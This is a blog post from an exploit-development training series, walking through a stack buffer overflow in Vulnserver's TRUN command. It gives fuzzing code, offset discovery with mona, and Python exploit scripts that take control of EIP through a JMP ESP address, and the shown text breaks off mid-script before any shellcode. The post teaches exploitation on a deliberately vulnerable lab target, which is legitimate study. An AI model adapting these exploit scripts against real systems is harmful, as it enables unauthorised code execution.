<!DOCTYPE html>
<html lang="en">

    <head><title>Vulnserver part 1: TRUN &ndash; XOR Grimoire</title>
<meta name="description" content="The eldritch tomb breathes as you unseal its ancient bindings, forgotten curses searing your mind as you ingest its forbidden knowledge.">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://xormancer.github.io/css/palettes/dark.css">
<link rel="stylesheet" href="https://xormancer.github.io/css/risotto.css">
<link rel="stylesheet" href="https://xormancer.github.io/css/custom.css">


<link rel="icon" href="https://xormancer.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://xormancer.github.io/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://xormancer.github.io/favicon-16x16.png">
<link rel="apple-touch-icon" href="https://xormancer.github.io/apple-touch-icon.png">
<link rel="manifest" href="https://xormancer.github.io/site.webmanifest">
</head>

    <body>
        <div class="page">

            <header class="page__header"><nav class="page__nav main-nav">
    <ul>
    <h1 class="page__logo"><a href="https://xormancer.github.io/" class="page__logo-inner">XOR Grimoire</a></h1>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="https://xormancer.github.io/posts/" title="">Posts</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item" href="https://xormancer.github.io/series/" title="">Series</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item" href="https://xormancer.github.io/whoami/" title="">Whoami</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <h1 id="vulnserver-part-1-trun">Vulnserver part 1: TRUN</h1>

    <hr>
<blockquote>
<p><strong>Vulnserver</strong> is a Windows based threaded TCP server application that is designed to be exploited, can we figure out how to weaponize the TRUN command?</p>
</blockquote>
<p><em>This post is a part of the <a href="/series/osed-prep/">OSED Prep</a> series!</em></p>
<h2 id="setup">Setup</h2>
<hr>
<ol>
<li><a href="https://github.com/stephenbradshaw/vulnserver">vulnserver</a></li>
<li><a href="https://github.com/jtpereyda/boofuzz">boofuzz</a> and <a href="https://www.python.org/downloads/">Python3</a></li>
<li><a href="https://x64dbg.com/">x64dbg</a> and <a href="https://github.com/x64dbg/mona">mona.py for x64dbg</a></li>
</ol>
<blockquote>
<p><em>Or any other windows debugger with <strong>mona.py</strong> support.</em></p>
</blockquote>
<ol start="4">
<li>A windows system to host the vulnserver executable, alongside a *nix system.</li>
</ol>
<blockquote>
<p><em><a href="https://www.kali.org/">Kali linux</a> or anything with pentesting tools will work perfectly fine.</em></p>
</blockquote>
<h2 id="initial-recon">Initial Recon</h2>
<hr>
<p>During my initial scan of the network, port <strong>9999</strong> is quickly identified as being open via a basic nmap scan.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap &lt;IP&gt; -Pn -n
</span></span></code></pre></div><table>
<thead>
<tr>
<th style="text-align:left">Flag</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>-Pn</code></td>
<td style="text-align:left">Disables host discovery</td>
</tr>
<tr>
<td style="text-align:left"><code>-n</code></td>
<td style="text-align:left">Disables DNS lookups</td>
</tr>
</tbody>
</table>
<p><img src="images/1_nmapScan.png" alt="Recon"></p>
<p>Lets connect via <strong>netcat</strong>, and explore some of the commands available to us.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc &lt;IP&gt; &lt;PORT&gt;
</span></span></code></pre></div><p><img src="images/2_TRUN.png" alt="TRUN"></p>
<p>For the purposes of this tutorial, I will be fuzzing the <strong>TRUN</strong> command. This application offers numerous exploitation paths, with this command being among the least difficult.</p>
<p>A small review of the source code denotes the possibility of a buffer overflow due to a unsafe <code>strcpy()</code> function call. Lets attempt to fuzz this command and see if our hypothesis is true.</p>
<h2 id="fuzzing-trun">Fuzzing TRUN</h2>
<hr>
<p>For the purposes of this tutorial I will be using <a href="https://github.com/jtpereyda/boofuzz">boofuzz</a>. You can find the fuzzing template below, which I have modified from <a href="https://github.com/philkeeble">philkeeble</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#!/usr/bin/python</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">from</span> boofuzz <span style="color:#fe8019">import</span> <span style="color:#fe8019">*</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Boofuzz template modified from https://github.com/philkeeble #</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">################################################################</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Function for grabbing the banner each time it connects</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">def</span> <span style="color:#fabd2f">get_banner</span>(target, my_logger, session, <span style="color:#fe8019">*</span>args, <span style="color:#fe8019">**</span>kwargs):
</span></span><span style="display:flex;"><span>  <span style="color:#928374;font-style:italic">## Set the function banner_template as the string we expect to see on connection</span>
</span></span><span style="display:flex;"><span>  banner_template <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;Welcome to Vulnerable Server! Enter HELP for help.&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#fe8019">try</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## Recieve buffer from the target</span>
</span></span><span style="display:flex;"><span>    banner <span style="color:#fe8019">=</span> target<span style="color:#fe8019">.</span>recv(<span style="color:#d3869b">10000</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#fe8019">except</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## If nothing recieved from the target, print and exit</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fabd2f">print</span>(<span style="color:#b8bb26">&#34;Unable to connect. Target is down. Exiting.&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#d3869b">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#928374;font-style:italic">## Printing to our log to let us know its recieving something</span>
</span></span><span style="display:flex;"><span>  my_logger<span style="color:#fe8019">.</span>log_check(<span style="color:#b8bb26">&#39;Receiving banner..&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#928374;font-style:italic">## Check that what we recieved contains the string we expected</span>
</span></span><span style="display:flex;"><span>  <span style="color:#fe8019">if</span> banner_template <span style="color:#fe8019">in</span> banner:
</span></span><span style="display:flex;"><span>    my_logger<span style="color:#fe8019">.</span>log_pass(<span style="color:#b8bb26">&#39;banner received&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#fe8019">else</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## If it doesn&#39;t contain the string we expected, fail and exit</span>
</span></span><span style="display:flex;"><span>    my_logger<span style="color:#fe8019">.</span>log_fail(<span style="color:#b8bb26">&#39;No banner received&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fabd2f">print</span>(<span style="color:#b8bb26">&#34;No banner received, exiting..&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#d3869b">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Main function</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">def</span> <span style="color:#fabd2f">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#928374;font-style:italic">## This is a boofuzz standard piece of code and is on their docs as a template</span>
</span></span><span style="display:flex;"><span>  session <span style="color:#fe8019">=</span> Session(
</span></span><span style="display:flex;"><span>	sleep_time<span style="color:#fe8019">=</span><span style="color:#d3869b">1</span>,
</span></span><span style="display:flex;"><span>    target<span style="color:#fe8019">=</span>Target(
</span></span><span style="display:flex;"><span>      <span style="color:#928374;font-style:italic">## This sets the connection host and port for vulnserver</span>
</span></span><span style="display:flex;"><span>      connection<span style="color:#fe8019">=</span>SocketConnection(<span style="color:#b8bb26">&#34;10.0.2.15&#34;</span>, <span style="color:#d3869b">9999</span>, proto<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#39;tcp&#39;</span>)
</span></span><span style="display:flex;"><span>    ),
</span></span><span style="display:flex;"><span>  )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#928374;font-style:italic">## Setup request</span>
</span></span><span style="display:flex;"><span>  s_initialize(name<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#34;Request&#34;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#fe8019">with</span> s_block(<span style="color:#b8bb26">&#34;Host-Line&#34;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## Send TRUN command to vulnserver</span>
</span></span><span style="display:flex;"><span>    s_static(<span style="color:#b8bb26">&#34;TRUN&#34;</span>, name<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#39;command name&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## Add a space after TRUN</span>
</span></span><span style="display:flex;"><span>    s_delim(<span style="color:#b8bb26">&#34; &#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## After TRUN and the space, add the fuzzing payloads</span>
</span></span><span style="display:flex;"><span>    s_string(<span style="color:#b8bb26">&#34;FUZZ&#34;</span>,  name<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#39;trun variable content&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#928374;font-style:italic">## Add a new line after the fuzzing payload (so that it sends)</span>
</span></span><span style="display:flex;"><span>    s_delim(<span style="color:#b8bb26">&#34;</span><span style="color:#b8bb26">\r\n</span><span style="color:#b8bb26">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#928374;font-style:italic">## Fuzzing</span>
</span></span><span style="display:flex;"><span>  session<span style="color:#fe8019">.</span>connect(s_get(<span style="color:#b8bb26">&#34;Request&#34;</span>), callback<span style="color:#fe8019">=</span>get_banner)
</span></span><span style="display:flex;"><span>  session<span style="color:#fe8019">.</span>fuzz()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Calls main</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">if</span> __name__ <span style="color:#fe8019">==</span> <span style="color:#b8bb26">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>	main()
</span></span></code></pre></div><p>After starting an instance of vulnserver on my windows VM, we can launch our fuzzing script in order to watch for any potential crashes.</p>
<p><strong>Note:</strong> this boofuzz script does not have the logic implimented in order to detect a successful crash, so ensure that you are launching vulnserver within your debugger in order to catch your crash!</p>
<p>On the 83rd test case, x64dbg announced that an exception had occurred. A quick glance at the state of our registers reveals an interesting discovery, our EIP has been overwritten!</p>
<p><img src="images/4_firstCrash.png" alt="Crash"></p>
<p>Further investigation shows that our stack pointer (<code>ESP</code>) now points to <code>2F2E2F2E</code>, which is the content of our payload. This means that we now have control of our programs execution flow.</p>
<p><img src="images/3_firstStack.png" alt="stack"></p>
<h2 id="finding-the-offest">Finding the offest</h2>
<hr>
<p>While it is great news that we have control over our programs stack, we need to figure our the exact offset within our payload that aligns with our EIP register. To do this, we will use <strong>mona.py</strong> to give us a unique pattern, which will allow us to find the exact offset of characters grants control of the <code>EIP</code> register.</p>
<p>While boofuzz utilized a buffer with a size of 10700, the source code proves that such a large size is unnecessary. Lets create a pattern with a length of 5000 to test our offset.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For x64dbg</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">import</span> python
</span></span><span style="display:flex;"><span>mona<span style="color:#fe8019">.</span>mona(<span style="color:#b8bb26">&#34;config -set workingfolder c:\mona&#34;</span>)
</span></span><span style="display:flex;"><span>mona<span style="color:#fe8019">.</span>mona(<span style="color:#b8bb26">&#34;pc 5000&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For immunity debugger / windbg</span>
</span></span><span style="display:flex;"><span>!mona config -set workingfolder c:<span style="color:#b8bb26">\m</span>ona
</span></span><span style="display:flex;"><span>!mona pc <span style="color:#d3869b">5000</span>
</span></span></code></pre></div><p><img src="images/5_offset.png" alt="offset"></p>
<p>Using the template below, enter your generated pattern and run the exploit against a new instance of vulnserver.</p>
<p><strong>Note:</strong> the commented out sections will be utilized in later stages of the exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">import</span> sys<span style="color:#fe8019">,</span> socket
</span></span><span style="display:flex;"><span><span style="color:#fe8019">from</span> time <span style="color:#fe8019">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RHOST <span style="color:#fe8019">=</span> <span style="color:#b8bb26">&#39;10.0.2.15&#39;</span>
</span></span><span style="display:flex;"><span>RPORT <span style="color:#fe8019">=</span> <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pattern <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;ENTER YOUR PATTERN HERE!&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## offset = 2003</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## EIP = &#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## nops = b&#34;\x90&#34; * 32</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## buf =  b&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## badc = b&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Finding the offset</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#fe8019">=</span> pattern
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Verify control</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## payload = b&#34;A&#34; * offset + EIP + &#34;\xCC&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Final stage</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## payload = b&#34;A&#34; * offset + EIP + nops + buf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">try</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## Payload options</span>
</span></span><span style="display:flex;"><span>	exploit <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;TRUN /.&#34;</span> <span style="color:#fe8019">+</span> payload
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## exploit = shellcode + b&#34;\r\n&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## exploit = shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	s <span style="color:#fe8019">=</span> socket<span style="color:#fe8019">.</span>socket(socket<span style="color:#fe8019">.</span>AF_INET, socket<span style="color:#fe8019">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>connect((RHOST,RPORT))
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>send((exploit))
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>recv(<span style="color:#d3869b">1024</span>)
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>close()
</span></span><span style="display:flex;"><span>	<span style="color:#fabd2f">print</span>(<span style="color:#b8bb26">&#34;Buffer sent&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#fe8019">except</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#fabd2f">print</span> (<span style="color:#b8bb26">&#34;Error connecting to server&#34;</span>)
</span></span><span style="display:flex;"><span>	sys<span style="color:#fe8019">.</span>exit()
</span></span></code></pre></div><p>Take note of your new EIP value after execution, which we will now pass into mona
in order to determine its offset within the pattern.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For x64dbg</span>
</span></span><span style="display:flex;"><span>mona<span style="color:#fe8019">.</span>mona(<span style="color:#b8bb26">&#34;po &lt;ENTER YOUR EIP RESULT HERE&gt;&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For immunity debugger / windbg</span>
</span></span><span style="display:flex;"><span>!mona po &lt;ENTER YOUR EIP RESULT HERE&gt;
</span></span></code></pre></div><p><img src="images/6_mona.png" alt="offset"></p>
<p>In my case, mona determined the value of 2005 to be my unique offset. Lets modify our python POC in order to confirm that mona has determined the correct value.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">import</span> sys<span style="color:#fe8019">,</span> socket
</span></span><span style="display:flex;"><span><span style="color:#fe8019">from</span> time <span style="color:#fe8019">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RHOST <span style="color:#fe8019">=</span> <span style="color:#b8bb26">&#39;10.0.2.15&#39;</span>
</span></span><span style="display:flex;"><span>RPORT <span style="color:#fe8019">=</span> <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## pattern = b&#34;&#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#fe8019">=</span> <span style="color:#d3869b">2005</span>
</span></span><span style="display:flex;"><span>EIP <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;B&#34;</span> <span style="color:#fe8019">*</span> <span style="color:#d3869b">4</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## nops = b&#34;\x90&#34; * 32</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## buf =  b&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## badc = b&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Finding the offset</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#payload = pattern</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Verify control</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;A&#34;</span> <span style="color:#fe8019">*</span> offset <span style="color:#fe8019">+</span> EIP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Final stage</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## payload = b&#34;A&#34; * offset + EIP + nops + buf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">try</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## Payload options</span>
</span></span><span style="display:flex;"><span>	exploit <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;TRUN /.&#34;</span> <span style="color:#fe8019">+</span> payload
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## exploit = shellcode + b&#34;\r\n&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## exploit = shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	s <span style="color:#fe8019">=</span> socket<span style="color:#fe8019">.</span>socket(socket<span style="color:#fe8019">.</span>AF_INET, socket<span style="color:#fe8019">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>connect((RHOST,RPORT))
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>send((exploit))
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>recv(<span style="color:#d3869b">1024</span>)
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>close()
</span></span><span style="display:flex;"><span>	<span style="color:#fabd2f">print</span>(<span style="color:#b8bb26">&#34;Buffer sent&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#fe8019">except</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#fabd2f">print</span> (<span style="color:#b8bb26">&#34;Error connecting to server&#34;</span>)
</span></span><span style="display:flex;"><span>	sys<span style="color:#fe8019">.</span>exit()
</span></span></code></pre></div><p>After modifying our initial script, we should be able to manipulate our <code>EIP</code> to whatever address we desire.</p>
<p><img src="images/7_control.png" alt="control"></p>
<p>Great! We have proven that by modifying the four bytes after our found offset, we can control <code>EIP</code>. The next step is to find a way to jump to our shellcode which is placed on the stack.</p>
<h2 id="jmping-around-memory">JMPing around memory</h2>
<hr>
<p>In order to execute our shellcode that resides on the stack after our EIP address, we need to somehow redirect our control flow to target the <code>ESP</code> register. Thankfully, mona includes a nifty command for sniffing out viable targets.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For x64dbg</span>
</span></span><span style="display:flex;"><span>mona<span style="color:#fe8019">.</span>mona(<span style="color:#b8bb26">&#34;modules&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For immunity debugger / windbg</span>
</span></span><span style="display:flex;"><span>!mona modules
</span></span></code></pre></div><p>After execution, mona will list out the loaded modules for our executable. As we are attempting to exploit the binary, we need to choose a module with minimal defense measures (such as ASLR). In this case, we will be choosing the included <strong>essfunc.dll</strong>. The vulnerable entry is highlighted in the image below.</p>
<p><img src="images/8_modules.png" alt="modules"></p>
<p>Now that we have a target, we need to search this given library for a suitable address to point our <code>EIP</code> register to. As stated earlier, we wish to redirect our programs flow of execution to the stack. As a result, we will be searching for the assembly operation <code>jmp, ESP</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For x64dbg</span>
</span></span><span style="display:flex;"><span>mona<span style="color:#fe8019">.</span>mona(<span style="color:#b8bb26">&#34;jmp -r ESP -m essfunc.dll&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For immunity debugger / windbg</span>
</span></span><span style="display:flex;"><span>!mona jmp -r ESP -m essfunc.dll
</span></span></code></pre></div><p>Rerun the previous script, replacing the 4 B characters with your found address. To make confirmation of control easier, place a breakpoint within your debugger. Alternatively, you can append the <code>\xCC</code> exception byte onto your payload, your choice!</p>
<p>To prove that we have control of the contents of execution after our jump, append a series of <code>\x90</code> operations after our exception call. This will allow us to visually confirm that we can place shellcode after landing in our desired location!</p>
<p><strong>Note:</strong> This programs address&rsquo;s are stored in little endian format, so ensure your address is entered correctly!</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">import</span> sys<span style="color:#fe8019">,</span> socket
</span></span><span style="display:flex;"><span><span style="color:#fe8019">from</span> time <span style="color:#fe8019">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RHOST <span style="color:#fe8019">=</span> <span style="color:#b8bb26">&#39;10.0.2.15&#39;</span>
</span></span><span style="display:flex;"><span>RPORT <span style="color:#fe8019">=</span> <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## pattern = b&#34;&#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#fe8019">=</span> <span style="color:#d3869b">2005</span>
</span></span><span style="display:flex;"><span>EIP <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;</span><span style="color:#b8bb26">\xaf\x11\x50\x62</span><span style="color:#b8bb26">&#34;</span>
</span></span><span style="display:flex;"><span>nops <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;</span><span style="color:#b8bb26">\x90</span><span style="color:#b8bb26">&#34;</span> <span style="color:#fe8019">*</span> <span style="color:#d3869b">32</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## buf =  b&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## badc = b&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Finding the offset</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## payload = pattern</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Verify control</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;A&#34;</span> <span style="color:#fe8019">*</span> offset <span style="color:#fe8019">+</span> EIP <span style="color:#fe8019">+</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;</span><span style="color:#b8bb26">\xCC</span><span style="color:#b8bb26">&#34;</span> <span style="color:#fe8019">+</span> nops
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Final payload</span>
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## payload = b&#34;A&#34; * offset + EIP + nops + buf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fe8019">try</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## Payload options</span>
</span></span><span style="display:flex;"><span>	exploit <span style="color:#fe8019">=</span> <span style="color:#b8bb26">b</span><span style="color:#b8bb26">&#34;TRUN /.&#34;</span> <span style="color:#fe8019">+</span> payload
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## exploit = shellcode + b&#34;\r\n&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#928374;font-style:italic">## exploit = shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	s <span style="color:#fe8019">=</span> socket<span style="color:#fe8019">.</span>socket(socket<span style="color:#fe8019">.</span>AF_INET, socket<span style="color:#fe8019">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>connect((RHOST,RPORT))
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>send((exploit))
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>recv(<span style="color:#d3869b">1024</span>)
</span></span><span style="display:flex;"><span>	s<span style="color:#fe8019">.</span>close()
